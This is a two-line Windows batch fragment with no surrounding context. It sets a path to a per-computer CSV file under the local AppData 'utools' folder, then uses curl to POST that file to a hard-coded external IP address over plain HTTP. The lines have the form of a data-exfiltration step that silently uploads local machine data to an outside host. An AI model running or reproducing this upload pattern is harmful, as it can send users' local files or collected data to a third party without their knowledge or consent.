set LogName="%LOCALAPPDATA%\utools\%COMPUTERNAME%.csv"

curl -X POST http://39.108.212.138  -F "file=@%LogName%"